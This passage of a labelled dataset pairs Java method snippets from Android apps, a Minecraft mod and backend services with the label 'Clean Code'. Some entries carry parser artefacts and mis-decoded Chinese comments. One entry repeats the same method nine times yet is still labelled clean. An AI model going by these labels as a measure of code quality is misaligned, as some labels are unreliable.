  flickerLoadingView.animate().alpha(0f).setDuration(220).setListener(new HideViewAfterAnimation(flickerLoadingView)).start();
  if (listView != null && listView.getAdapter() != null) {
  }
}",0,Clean Code
"@Override public void render(HudRenderer renderer){
  if (Modules.get() == null || modules.get().isEmpty()) {
    renderer.text(""Module Info"",x,y,moduleColor.get(),textShadow.get());
    setSize(renderer.textWidth(""Module Info""),renderer.textHeight());
    return;
  }
  double y=this.y;
  double width=0;
  double height=0;
  int i=0;
  for (  Module module : modules.get()) {
    double moduleWidth=renderer.textWidth(module.title) + renderer.textWidth("" "");
    String text=null;
    if (module.isActive()) {
      if (additionalInfo.get()) {
        String info=module.getInfoString();
        if (info != null)         text=info;
      }
      if (text == null)       text=""ON"";
    }
 else     text=""OFF"";
    moduleWidth+=renderer.textWidth(text);
    double x=this.x + alignX(moduleWidth,alignment.get());
    x=renderer.text(module.title,x,y,moduleColor.get(),textShadow.get());
    renderer.text(text,x + renderer.textWidth("" ""),y,module.isActive() ? onColor.get() : offColor.get(),textShadow.get());
    y+=renderer.textHeight() + 2;
    width=Math.max(width,moduleWidth);
    height+=renderer.textHeight();
    if (i > 0)     height+=2;
    i++;
  }
  setSize(width,height);
}",0,Clean Code
"/** 
 * Replaces the local Aliucord version with the latest from Github
 * @param ctx Context
 * @throws Throwable If an error occurred
 */
public static void updateAliucord(Context ctx) throws Throwable {
  Class<?> c;
  try {
    c=Class.forName(""com.aliucord.injector.InjectorKt"");
  }
 catch (  ClassNotFoundException e) {
    c=Class.forName(""com.aliucord.injector.Injector"");
  }
  ReflectUtils.invokeMethod(c,(Object)null,""downloadLatestAliucordDex"",new File(ctx.getCodeCacheDir(),""Aliucord.zip""));
}
",0,Clean Code
"public GProGuildOnlineReportReq(){
  this.browseInfo=new ArrayList<>();
  this.exts=new ArrayList<>();
}
public GProGuildOnlineReportReq(long j2,int i2,ArrayList<GProGuildBrowseInfo> arrayList,boolean z,int i3,int i4,ArrayList<GProGuildOnlineReportExtInfo> arrayList2){
  this.browseInfo=new ArrayList<>();
  this.exts=new ArrayList<>();
  this.tinyId=j2;
  this.activeTab=i2;
  this.browseInfo=arrayList;
  this.isVisiting=z;
  this.scene=i3;
  this.sourceType=i4;
  this.exts=arrayList2;
}",0,Clean Code
"public void tryAssemble(AbstractMinecart cart){
  if (cart == null)   return;
  if (!isMinecartUpdateValid())   return;
  resetTicksSinceMinecartUpdate();
  BlockState state=level.getBlockState(worldPosition);
  if (!AllBlocks.CART_ASSEMBLER.has(state))   return;
  CartAssemblerBlock block=(CartAssemblerBlock)state.getBlock();
  CartAssemblerBlock.CartAssemblerAction action=CartAssemblerBlock.getActionForCart(state,cart);
  if (action.shouldAssemble())   assemble(level,worldPosition,cart);
  if (action.shouldDisassemble())   disassemble(level,worldPosition,cart);
  if (action == CartAssemblerBlock.CartAssemblerAction.ASSEMBLE_ACCELERATE) {
    if (cart.getDeltaMovement().length() > 1 / 128f) {
      Direction facing=cart.getMotionDirection();
      RailShape railShape=state.getValue(CartAssemblerBlock.RAIL_SHAPE);
      for (      Direction d : Iterate.directionsInAxis(railShape == RailShape.EAST_WEST ? Axis.X : Axis.Z))       if (level.getBlockState(worldPosition.relative(d)).isRedstoneConductor(level,worldPosition.relative(d)))       facing=d.getOpposite();
      float speed=block.getRailMaxSpeed(state,level,worldPosition,cart);
      cart.setDeltaMovement(facing.getStepX() * speed,facing.getStepY() * speed,facing.getStepZ() * speed);
    }
  }
  if (action == CartAssemblerBlock.CartAssemblerAction.ASSEMBLE_ACCELERATE_DIRECTIONAL) {
    Vec3i accelerationVector=ControllerRailBlock.getAccelerationVector(AllBlocks.CONTROLLER_RAIL.getDefaultState().setValue(ControllerRailBlock.SHAPE,state.getValue(CartAssemblerBlock.RAIL_SHAPE)).setValue(ControllerRailBlock.BACKWARDS,state.getValue(CartAssemblerBlock.BACKWARDS)));
    float speed=block.getRailMaxSpeed(state,level,worldPosition,cart);
    cart.setDeltaMovement(Vec3.atLowerCornerOf(accelerationVector).scale(speed));
  }
  if (action == CartAssemblerBlock.CartAssemblerAction.DISASSEMBLE_BRAKE) {
    Vec3 diff=VecHelper.getCenterOf(worldPosition).subtract(cart.position());
    cart.setDeltaMovement(diff.x / 16f,0,diff.z / 16f);
  }
}",0,Clean Code
"@Override public void init(){
  float mNavigationHeight=((float)mPrefsMap.getInt(""system_ui_navigation_custom_height"",100) / 10);
  float mNavigationHeightLand=((float)mPrefsMap.getInt(""system_ui_navigation_custom_height_land"",100) / 10);
  float mNavigationFrameHeight=((float)mPrefsMap.getInt(""system_ui_navigation_frame_custom_height"",100) / 10);
  float mNavigationFrameHeightLand=((float)mPrefsMap.getInt(""system_ui_navigation_frame_custom_height_land"",100) / 10);
  try {
    mResHook.setDensityReplacement(""com.android.systemui"",""dimen"",""navigation_bar_height"",mNavigationHeight);
  }
 catch (  Exception e) {
    logE(TAG,this.lpparam.packageName,""navigation_bar_height error"",e);
  }
  try {
    mResHook.setDensityReplacement(""com.android.systemui"",""dimen"",""navigation_bar_height_landscape"",mNavigationHeightLand);
  }
 catch (  Exception e) {
    logE(TAG,this.lpparam.packageName,""navigation_bar_height_landscape error"",e);
  }
  try {
    mResHook.setDensityReplacement(""com.android.systemui"",""dimen"",""navigation_bar_frame_height"",mNavigationFrameHeight);
  }
 catch (  Exception e) {
    logE(TAG,this.lpparam.packageName,""navigation_bar_frame_height error"",e);
  }
  try {
    mResHook.setDensityReplacement(""com.android.systemui"",""dimen"",""navigation_bar_frame_height_landscape"",mNavigationFrameHeightLand);
  }
 catch (  Exception e) {
    logE(TAG,this.lpparam.packageName,""navigation_bar_frame_height_landscape error"",e);
  }
}",0,Clean Code
"/** 
 * Creates a new instance that initially has no backing data. 
 */
public ParsableByteArray(){
  data=Util.EMPTY_BYTE_ARRAY;
}
/** 
 * Creates a new instance with  {@code limit} bytes and sets the limit.
 * @param limit The limit to set.
 */
public ParsableByteArray(int limit){
  this.data=new byte[limit];
  this.limit=limit;
}
/** 
 * Creates a new instance wrapping  {@code data}, and sets the limit to  {@code data.length}.
 * @param data The array to wrap.
 */
public ParsableByteArray(byte[] data){
  this.data=data;
  limit=data.length;
}
/** 
 * Creates a new instance that wraps an existing array.
 * @param data The data to wrap.
 * @param limit The limit to set.
 */
public ParsableByteArray(byte[] data,int limit){
  this.data=data;
  this.limit=limit;
}
",0,Clean Code
"public Response reportList(String name,Long startTime,Long endTime){
  if (EMPTY_CHAR.equals(name) || Strings.isNullOrEmpty(name)) {
    name=EMPTY_STRING;
  }
  if (Math.abs(endTime - startTime) > TimeUnit.DAYS.toMillis(3)) {
    return handlerError(""list"",-1,""查询时间区间超过三天，请修改查询条件"");
  }
  long threeDayAgo=DateUtil.plusDays(System.currentTimeMillis(),-3);
  if (startTime < threeDayAgo) {
    return handlerError(""list"",-1,""监控数据不能查询三天前的数据，请修改查询条件"");
  }
  try {
    String latestTime=KV_DB.get(LATEST_TIME);
    if (Strings.isNullOrEmpty(latestTime)) {
      return handlerError(""list"",-2,""没有查询到监控数据"");
    }
    if (startTime >= endTime) {
      return handlerError(""list"",-1,""开始时间应当小于结束时间"");
    }
    Long latestMinute=Long.parseLong(latestTime);
    startTime=DateUtil.transformToMinute(startTime);
    endTime=DateUtil.transformToMinute(endTime);
    if (latestMinute < endTime) {
      endTime=latestMinute;
    }
    final long interval=computeInterval(startTime,endTime);
    List<String> result=new ArrayList<>();
    int errorCount=0;
    while (endTime >= startTime) {
      try {
        result.add(polymerize(startTime,interval,name));
      }
 catch (      Exception e) {
        logger.error(""参数聚合错误"",e);
        if (errorCount++ > MAX_ERROR_COUNT) {
          throw new RuntimeException(""监控结果采样发生错误超过"" + MAX_ERROR_COUNT + ""次，放弃本次查询"");
        }
        continue;
      }
 finally {
        startTime+=interval;
      }
    }
    return handlerSuccess(""list"",result);
  }
 catch (  Throwable e) {
    logger.error(""监控数据数据查询错误。"",e);
    return handlerError(""list"",-1,""监控数据数据查询错误。"" + e.getClass() + ""，""+ e.getMessage());
  }
}",0,Clean Code
"@Test public void testDecodeTxxxFrame(){
  byte[] rawId3=buildSingleFrameTag(""TXXX"",new byte[]{3,0,109,100,105,97,108,111,103,95,86,73,78,68,73,67,79,49,53,50,55,54,54,52,95,115,116,97,114,116,0});
  Id3Decoder decoder=new Id3Decoder();
  Metadata metadata=decoder.decode(rawId3,rawId3.length);
  assertThat(metadata.length()).isEqualTo(1);
  TextInformationFrame textInformationFrame=(TextInformationFrame)metadata.get(0);
  assertThat(textInformationFrame.id).isEqualTo(""TXXX"");
  assertThat(textInformationFrame.description).isEmpty();
  assertThat(textInformationFrame.value).isEqualTo(""mdialog_VINDICO1527664_start"");
  rawId3=buildSingleFrameTag(""TXXX"",new byte[0]);
  metadata=decoder.decode(rawId3,rawId3.length);
  assertThat(metadata.length()).isEqualTo(0);
  rawId3=buildSingleFrameTag(""TXXX"",new byte[]{ID3_TEXT_ENCODING_UTF_8});
  metadata=decoder.decode(rawId3,rawId3.length);
  assertThat(metadata.length()).isEqualTo(1);
  textInformationFrame=(TextInformationFrame)metadata.get(0);
  assertThat(textInformationFrame.id).isEqualTo(""TXXX"");
  assertThat(textInformationFrame.description).isEmpty();
  assertThat(textInformationFrame.value).isEmpty();
}",0,Clean Code
"private IndexedArrayExampleProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private IndexedArrayExampleProto(){
  featureName_=com.google.protobuf.LazyStringArrayList.EMPTY;
  featureIdx_=emptyIntList();
  featureValue_=emptyDoubleList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@3e5973e2",0,Clean Code
"private float scale1(){
  return scale1(true);
}
private float scale1(boolean fit){
  if (sendPhotoType == SELECT_TYPE_STICKER) {
    int width=getContainerViewWidth();
    if (width == 0)     width=AndroidUtilities.displaySize.x;
    float scale=(width - dp(20) + 1) / (float)width;
    if (fit) {
      int w=centerImage.getBitmapWidth();
      int h=centerImage.getBitmapHeight();
      if ((w <= 1 || h <= 1) && currentIndex >= 0 && currentIndex < imagesArrLocals.size()) {
        Object object=imagesArrLocals.get(currentIndex);
        if (object instanceof MediaController.PhotoEntry) {
          MediaController.PhotoEntry photoEntry=((MediaController.PhotoEntry)object);
          if (photoEntry.orientation / 90 % 2 != 0) {
            w=photoEntry.height;
            h=photoEntry.width;
          }
 else {
            w=photoEntry.width;
            h=photoEntry.height;
          }
        }
      }
      if (w > 1 && h > 1 && w > h) {
        scale*=(float)w / h;
      }
    }
    return scale;
  }
  return 1f;
}",0,Clean Code
"@java.lang.Override public void writeTo(com.google.protobuf.CodedOutputStream output) throws java.io.IOException {
  getSerializedSize();
  if (output_ != null) {
    output.writeMessage(1,getOutput());
  }
  if (outputIdx_ != 0) {
    output.writeInt32(2,outputIdx_);
  }
  for (int i=0; i < featureName_.size(); i++) {
    com.google.protobuf.GeneratedMessageV3.writeString(output,3,featureName_.getRaw(i));
  }
  if (getFeatureIdxList().size() > 0) {
    output.writeUInt32NoTag(34);
    output.writeUInt32NoTag(featureIdxMemoizedSerializedSize);
  }
  for (int i=0; i < featureIdx_.size(); i++) {
    output.writeInt32NoTag(featureIdx_.getInt(i));
  }
  if (getFeatureValueList().size() > 0) {
    output.writeUInt32NoTag(42);
    output.writeUInt32NoTag(featureValueMemoizedSerializedSize);
  }
  for (int i=0; i < featureValue_.size(); i++) {
    output.writeDoubleNoTag(featureValue_.getDouble(i));
  }
  com.google.protobuf.GeneratedMessageV3.serializeStringMapTo(output,internalGetMetadata(),MetadataDefaultEntryHolder.defaultEntry,6);
  if (java.lang.Float.floatToRawIntBits(weight_) != 0) {
    output.writeFloat(7,weight_);
  }
  if (featureDomain_ != null) {
    output.writeMessage(8,getFeatureDomain());
  }
  if (outputDomain_ != null) {
    output.writeMessage(9,getOutputDomain());
  }
  unknownFields.writeTo(output);
}",0,Clean Code
"@Override public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder,int position){
  if (position < 0 || position >= items.size())   return;
  SMSStatsActivity.Item item=items.get(position);
  final int viewType=holder.getItemViewType();
  final boolean divider=position + 1 < items.size() && items.get(position + 1).viewType == viewType;
  if (viewType == VIEW_TYPE_SHADOW) {
    TextInfoPrivacyCell cell=(TextInfoPrivacyCell)holder.itemView;
    final boolean isLast=position == items.size() - 1;
    if (TextUtils.isEmpty(item.text)) {
      cell.setFixedSize(isLast ? 350 : 21);
      cell.setText("""");
    }
 else {
      cell.setFixedSize(0);
      cell.setText(item.text);
    }
  }
 else   if (viewType == VIEW_TYPE_BUTTON) {
    TextCell cell=(TextCell)holder.itemView;
    if (item.red) {
      cell.setColors(Theme.key_text_RedBold,Theme.key_text_RedRegular);
    }
 else {
      cell.setColors(Theme.key_windowBackgroundWhiteGrayIcon,Theme.key_windowBackgroundWhiteBlackText);
    }
    if (item.id == BUTTON_HISTORY) {
      cell.setTextAndValueAndIcon(item.text.toString(),item.error ? error(19) : null,item.icon,divider);
    }
 else     if (item.id == BUTTON_SIM) {
      SMSJobController.SIM sim=SMSJobController.getInstance(currentAccount).getSelectedSIM();
      String simCard=sim == null ? """" : sim.name;
      if (item.icon == 0) {
        cell.setTextAndValue(item.text.toString(),simCard,divider);
      }
 else {
        cell.setTextAndValueAndIcon(item.text.toString(),simCard,item.icon,divider);
      }
    }
 else     if (item.icon == 0) {
      cell.setText(item.text,divider);
    }
 else {
      cell.setTextAndIcon(item.text,item.icon,divider);
    }
  }
 else   if (viewType == VIEW_TYPE_SWITCH) {
    TextCell cell=(TextCell)holder.itemView;
    boolean checked=false;
    if (item.id == BUTTON_ALLOW_INTERNATIONAL) {
      checked=allowInternational;
    }
    cell.setTextAndCheck(item.text,checked,divider);
  }
 else   if (viewType == VIEW_TYPE_TABLE) {
    ((TableView)holder.itemView).update(false);
  }
 else   if (viewType == VIEW_TYPE_HEADERCELL) {
    ((HeaderCell)holder.itemView).setText(item.text);
  }
}
@Override public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder,int position){
  position-=2;
  ArrayList<SMSJobController.JobEntry> entries=SMSJobController.getInstance(currentAccount).journal;
  if (position < 0 || entries == null || position >= entries.size()) {
    return;
  }
  ((TableCell)holder.itemView).setEntry(entries.get(position),position + 1 == entries.size());
}",0,Clean Code
"public void setHost(String host){
  if (UrlUtils.isVaildUrl(host)) {
    this.uri=host;
    this.host=UrlUtils.getHost(host);
  }
 else   if (DomainUtils.isValidDomainMayPort(host)) {
    List<String> hosts=DomainUtils.grepDomainNoPort(host);
    if (hosts.size() > 0) {
      this.host=hosts.get(0);
    }
  }
 else {
    List<String> hosts=IPAddressUtils.grepIPv4NoPort(host);
    if (hosts.size() > 0) {
      this.host=hosts.get(0);
    }
  }
  if (StringUtils.isEmpty(this.host)) {
    this.host=host;
  }
  if (StringUtils.isEmpty(rootDomain)) {
    if (DomainUtils.isValidDomainMayPort(host)) {
      this.rootDomain=DomainUtils.getRootDomain(host);
    }
  }
}",0,Clean Code
"private void moveUp(int newDialogHeight){
  if (getDialogImpl() != null && getDialogImpl().boxBody != null) {
    View bodyView=getDialogImpl().boxBody;
    if (getDialogImpl() == null || bodyView == null)     return;
    if (style.popNotificationSettings() != null)     align=style.popNotificationSettings().align();
    if (align == null)     align=DialogXStyle.PopNotificationSettings.ALIGN.TOP;
    float moveAimTop=0;
    float y=bodyView.getY();
    if (bodyView.getTag() instanceof PopValueAnimator) {
      ((PopValueAnimator)bodyView.getTag()).end();
      y=((PopValueAnimator)bodyView.getTag()).getEndValue();
    }
switch (align) {
case TOP:
      moveAimTop=y + newDialogHeight * 1.1f;
    break;
case TOP_INSIDE:
  moveAimTop=y + newDialogHeight - bodyView.getPaddingTop();
break;
case CENTER:
case BOTTOM:
case BOTTOM_INSIDE:
moveAimTop=y - newDialogHeight * 1.1f;
break;
}
PopValueAnimator valueAnimator=PopValueAnimator.ofFloat(bodyView.getY(),moveAimTop);
bodyView.setTag(valueAnimator);
valueAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener(){
@Override public void onAnimationUpdate(ValueAnimator animation){
if (getDialogImpl() == null || !isShow) {
animation.cancel();
return;
}
View bodyView=getDialogImpl().boxBody;
if (bodyView != null && bodyView.isAttachedToWindow()) {
bodyView.setY(defaultTop=(Float)animation.getAnimatedValue());
}
}
}
);
valueAnimator.setDuration(enterAnimDuration == -1 ? 300 : enterAnimDuration).setInterpolator(new DecelerateInterpolator(2f));
valueAnimator.start();
}
}",0,Clean Code
"@Override public void drawOnScrimWithScale(Canvas canvas,float scale){
  final View panel=mBottomSheetBackground;
  final boolean hasBottomSheet=panel.getVisibility() == VISIBLE;
  final float translationY=((View)panel.getParent()).getTranslationY();
  final float horizontalScaleOffset=(1 - scale) * panel.getWidth() / 2;
  final float verticalScaleOffset=(1 - scale) * (panel.getHeight() - getHeight() / 2);
  final float topNoScale=panel.getTop() + translationY;
  final float topWithScale=topNoScale + verticalScaleOffset;
  final float leftWithScale=panel.getLeft() + horizontalScaleOffset;
  final float rightWithScale=panel.getRight() - horizontalScaleOffset;
  if (hasBottomSheet) {
    mHeaderPaint.setColor(mBottomSheetBackgroundColor);
    mHeaderPaint.setAlpha((int)(255 * mBottomSheetAlpha));
    mTmpRectF.set(leftWithScale,topWithScale,rightWithScale,panel.getBottom());
    mTmpPath.reset();
    mTmpPath.addRoundRect(mTmpRectF,mBottomSheetCornerRadii,Direction.CW);
    canvas.drawPath(mTmpPath,mHeaderPaint);
  }
  if (DEBUG_HEADER_PROTECTION) {
    mHeaderPaint.setColor(Color.MAGENTA);
    mHeaderPaint.setAlpha(255);
  }
 else {
    mHeaderPaint.setColor(mHeaderColor);
    mHeaderPaint.setAlpha((int)(getAlpha() * Color.alpha(mHeaderColor)));
  }
  if (mHeaderPaint.getColor() == mScrimColor || mHeaderPaint.getColor() == 0) {
    return;
  }
  final float headerBottomNoScale=getHeaderBottom() + getVisibleContainerView().getPaddingTop();
  final float headerHeightNoScale=headerBottomNoScale - topNoScale;
  final float headerBottomWithScaleOnTablet=topWithScale + headerHeightNoScale * scale;
  final float headerBottomOffset=(getVisibleContainerView().getHeight() * (1 - scale) / 2);
  final float headerBottomWithScaleOnPhone=headerBottomNoScale * scale + headerBottomOffset;
  final FloatingHeaderView headerView=getFloatingHeaderView();
  if (hasBottomSheet) {
    if (!isSearchBarFloating() || mUsingTabs) {
      mTmpRectF.set(leftWithScale,topWithScale,rightWithScale,headerBottomWithScaleOnTablet);
      mTmpPath.reset();
      mTmpPath.addRoundRect(mTmpRectF,mBottomSheetCornerRadii,Direction.CW);
      canvas.drawPath(mTmpPath,mHeaderPaint);
    }
  }
 else {
    canvas.drawRect(0,0,canvas.getWidth(),headerBottomWithScaleOnPhone,mHeaderPaint);
  }
  final int tabsHeight=headerView.getPeripheralProtectionHeight();
  if (mTabsProtectionAlpha > 0 && tabsHeight != 0) {
    if (DEBUG_HEADER_PROTECTION) {
      mHeaderPaint.setColor(Color.BLUE);
      mHeaderPaint.setAlpha(255);
    }
 else {
      mHeaderPaint.setAlpha((int)(getAlpha() * mTabsProtectionAlpha));
    }
    float left=0f;
    float right=canvas.getWidth();
    if (hasBottomSheet) {
      left=mBottomSheetBackground.getLeft() + horizontalScaleOffset;
      right=mBottomSheetBackground.getRight() - horizontalScaleOffset;
    }
    final float tabTopWithScale=hasBottomSheet ? headerBottomWithScaleOnTablet : headerBottomWithScaleOnPhone;
    final float tabBottomWithScale=tabTopWithScale + tabsHeight * scale;
    canvas.drawRect(left,tabTopWithScale,right,tabBottomWithScale,mHeaderPaint);
  }
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.interop.oci.protos.OCIOutputConverterProto)) {
    return super.equals(obj);
  }
  org.tribuo.interop.oci.protos.OCIOutputConverterProto other=(org.tribuo.interop.oci.protos.OCIOutputConverterProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public Criteria andGmtModifiedGreaterThan(Date value){
  addCriterion(""gmt_modified >"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedGreaterThan(Date value){
  addCriterion(""gmt_modified >"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedGreaterThan(Date value){
  addCriterion(""gmt_modified >"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedGreaterThan(Date value){
  addCriterion(""gmt_modified >"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedGreaterThan(Date value){
  addCriterion(""gmt_modified >"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedGreaterThan(Date value){
  addCriterion(""gmt_modified >"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedGreaterThan(Date value){
  addCriterion(""gmt_modified >"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedGreaterThan(Date value){
  addCriterion(""gmt_modified >"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedGreaterThan(Date value){
  addCriterion(""gmt_modified >"",value,""gmtModified"");
  return (Criteria)this;
}
",0,Clean Code
"public String hexToBt4(String hex){
  String binary="""";
  if (hex.equalsIgnoreCase(""0"")) {
    binary=""0000"";
  }
 else   if (hex.equalsIgnoreCase(""1"")) {
    binary=""0001"";
  }
  if (hex.equalsIgnoreCase(""2"")) {
    binary=""0010"";
  }
  if (hex.equalsIgnoreCase(""3"")) {
    binary=""0011"";
  }
  if (hex.equalsIgnoreCase(""4"")) {
    binary=""0100"";
  }
  if (hex.equalsIgnoreCase(""5"")) {
    binary=""0101"";
  }
  if (hex.equalsIgnoreCase(""6"")) {
    binary=""0110"";
  }
  if (hex.equalsIgnoreCase(""7"")) {
    binary=""0111"";
  }
  if (hex.equalsIgnoreCase(""8"")) {
    binary=""1000"";
  }
  if (hex.equalsIgnoreCase(""9"")) {
    binary=""1001"";
  }
  if (hex.equalsIgnoreCase(""A"")) {
    binary=""1010"";
  }
  if (hex.equalsIgnoreCase(""B"")) {
    binary=""1011"";
  }
  if (hex.equalsIgnoreCase(""C"")) {
    binary=""1100"";
  }
  if (hex.equalsIgnoreCase(""D"")) {
    binary=""1101"";
  }
  if (hex.equalsIgnoreCase(""E"")) {
    binary=""1110"";
  }
  if (hex.equalsIgnoreCase(""F"")) {
    binary=""1111"";
  }
  return binary;
}",0,Clean Code
"/** 
 * 閫氳繃鍙嶅悜浠ｇ悊鍙戦佹秷鎭 杩欐槸鎴戣嚜宸盋loudflare Worker鐨勪緥瀛
 * @param data body of post
 */
private void send2ReverseProxy(String url,Map<String,Object> data){
  HttpHeaders headers=new HttpHeaders();
  headers.add(""content-type"",MediaType.APPLICATION_JSON_VALUE);
  headers.add(""User-Agent"","""");
  Map<String,Object> body=new HashMap<>(4);
  body.put(""to"",url);
  body.put(""data"",data);
  HttpEntity httpEntity=new HttpEntity(body,headers);
  ResponseEntity<String> response=sendPostRequest(telegramProperties.getReverseProxyUrl(),httpEntity,String.class);
  log.info(""send2ReverseProxy => reverseProxyUrl: {}"",telegramProperties.getReverseProxyUrl());
  log.info(""send2ReverseProxy => destUrl: {}"",url);
  log.info(""send2ReverseProxy => response: {}"",response);
}",0,Clean Code
"PathImpl(@NonNull Context context,@NonNull String fileLocation){
  super(context,getRequiredRawDocument(fileLocation));
}
PathImpl(@NonNull Context context,@NonNull VirtualFileSystem fs){
  super(context,new VirtualDocumentFile(getParentFile(context,fs),fs));
}
PathImpl(@NonNull Context context,@NonNull String fileLocation,boolean privileged) throws RemoteException {
  super(context,null);
  if (privileged) {
    FileSystemManager fs=LocalServices.getFileSystemManager();
    documentFile=new ExtendedRawDocumentFile(fs.getFile(fileLocation));
  }
 else {
    ExtendedFile file=FileSystemManager.getLocal().getFile(fileLocation);
    documentFile=new ExtendedRawDocumentFile(LocalFileOverlay.getOverlayFile(file));
  }
}
!org.eclipse.jdt.core.dom.MethodDeclaration@67a8899a/** 
 * NOTE: This construct is only applicable for tree Uri
 */
PathImpl(@Nullable Path parent,@NonNull Context context,@NonNull Uri documentUri){
  super(context,null);
  DocumentFile parentDocumentFile=parent != null ? parent.documentFile : null;
  documentFile=DocumentFileUtils.newTreeDocumentFile(parentDocumentFile,context,documentUri);
}
private PathImpl(@NonNull Context context,@NonNull DocumentFile documentFile){
  super(context,null);
  if (documentFile instanceof ExtendedRawDocumentFile) {
    ExtendedFile file=((ExtendedRawDocumentFile)documentFile).getFile();
    if (file instanceof LocalFile) {
      ExtendedFile newFile=LocalFileOverlay.getOverlayFileOrNull(file);
      if (newFile != null) {
        documentFile=new ExtendedRawDocumentFile(newFile);
      }
    }
  }
  this.documentFile=documentFile;
}",0,Clean Code
"public static void refresh(){
  String apiHost=""https://aip.baidubce.com/rpc/2.0/ai_custom/v1/wenxinworkshop/chat/completions_pro"";
  String accessToken="""";
  ConfigService configService=ApplicationContextUtil.getBean(ConfigService.class);
  Config apiHostConfig=configService.find(WENXIN_HOST).getData();
  if (apiHostConfig != null && StringUtils.isNotBlank(apiHostConfig.getContent())) {
    apiHost=apiHostConfig.getContent();
    if (apiHost.endsWith(""/"")) {
      apiHost=apiHost.substring(0,apiHost.length() - 1);
    }
  }
  Config config=configService.find(WENXIN_ACCESS_TOKEN).getData();
  if (config != null && StringUtils.isNotBlank(config.getContent())) {
    accessToken=config.getContent();
  }
  WENXIN_AI_CLIENT=WenxinAIStreamClient.builder().accessToken(accessToken).apiHost(apiHost).build();
}",0,Clean Code
"/** 
 * 璁剧疆LoginLog瀵硅薄灞炴��
 * @param request     璇锋眰瀵硅薄
 * @param status      鐧诲綍鐘舵��
 * @param description 鎿嶄綔鎻忚堪
 * @return
 */
private LoginLog handleLog(HttpServletRequest request,boolean status,String description){
  String username=currentUsername.get();
  currentUsername.remove();
  String ip=IpAddressUtils.getIpAddress(request);
  String userAgent=request.getHeader(""User-Agent"");
  LoginLog log=new LoginLog(username,ip,status,description,userAgent);
  return log;
}
",0,Clean Code
"private SelectedFeatureDatasetProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private SelectedFeatureDatasetProto(){
  examples_=java.util.Collections.emptyList();
  selectedFeatures_=com.google.protobuf.LazyStringArrayList.EMPTY;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@27fee047",0,Clean Code
"@PostConstruct @VisibleForTesting void initGlobalBindingMap(){
  globalBindingMap.put(""basePackage"",codegenProperties.getBasePackage());
  globalBindingMap.put(""baseFrameworkPackage"",codegenProperties.getBasePackage() + '.' + ""framework"");
  globalBindingMap.put(""jakartaPackage"",jakartaEnable ? ""jakarta"" : ""javax"");
  globalBindingMap.put(""CommonResultClassName"",CommonResult.class.getName());
  globalBindingMap.put(""PageResultClassName"",PageResult.class.getName());
  globalBindingMap.put(""PageParamClassName"",PageParam.class.getName());
  globalBindingMap.put(""DictFormatClassName"",DictFormat.class.getName());
  globalBindingMap.put(""BaseDOClassName"",BaseDO.class.getName());
  globalBindingMap.put(""baseDOFields"",CodegenBuilder.BASE_DO_FIELDS);
  globalBindingMap.put(""QueryWrapperClassName"",LambdaQueryWrapperX.class.getName());
  globalBindingMap.put(""BaseMapperClassName"",BaseMapperX.class.getName());
  globalBindingMap.put(""ServiceExceptionUtilClassName"",ServiceExceptionUtil.class.getName());
  globalBindingMap.put(""DateUtilsClassName"",DateUtils.class.getName());
  globalBindingMap.put(""ExcelUtilsClassName"",ExcelUtils.class.getName());
  globalBindingMap.put(""LocalDateTimeUtilsClassName"",LocalDateTimeUtils.class.getName());
  globalBindingMap.put(""ObjectUtilsClassName"",ObjectUtils.class.getName());
  globalBindingMap.put(""DictConvertClassName"",DictConvert.class.getName());
  globalBindingMap.put(""ApiAccessLogClassName"",ApiAccessLog.class.getName());
  globalBindingMap.put(""OperateTypeEnumClassName"",OperateTypeEnum.class.getName());
  globalBindingMap.put(""BeanUtils"",BeanUtils.class.getName());
}
",0,Clean Code
"@Override protected void handleTextMessage(WebSocketSession session,TextMessage message) throws Exception {
  if (message.getPayloadLength() == 0) {
    return;
  }
  if (message.getPayloadLength() == 4 && Objects.equals(message.getPayload(),""ping"")) {
    session.sendMessage(new TextMessage(""pong""));
    return;
  }
  try {
    JsonWebSocketMessage jsonMessage=JsonUtils.parseObject(message.getPayload(),JsonWebSocketMessage.class);
    if (jsonMessage == null) {
      log.error(""[handleTextMessage][session({}) message({}) 瑙ｆ瀽涓虹┖]"",session.getId(),message.getPayload());
      return;
    }
    if (StrUtil.isEmpty(jsonMessage.getType())) {
      log.error(""[handleTextMessage][session({}) message({}) 绫诲瀷涓虹┖]"",session.getId(),message.getPayload());
      return;
    }
    WebSocketMessageListener<Object> messageListener=listeners.get(jsonMessage.getType());
    if (messageListener == null) {
      log.error(""[handleTextMessage][session({}) message({}) 鐩戝惉鍣ㄤ负绌篯"",session.getId(),message.getPayload());
      return;
    }
    Type type=TypeUtil.getTypeArgument(messageListener.getClass(),0);
    Object messageObj=JsonUtils.parseObject(jsonMessage.getContent(),type);
    Long tenantId=WebSocketFrameworkUtils.getTenantId(session);
    TenantUtils.execute(tenantId,() -> messageListener.onMessage(session,messageObj));
  }
 catch (  Throwable ex) {
    log.error(""[handleTextMessage][session({}) message({}) 澶勭悊寮傚父]"",session.getId(),message.getPayload());
  }
}",0,Clean Code
"public KeyPreviewView getKeyPreviewView(final Key key,final ViewGroup placerView){
  KeyPreviewView keyPreviewView=mShowingKeyPreviewViews.remove(key);
  if (keyPreviewView != null) {
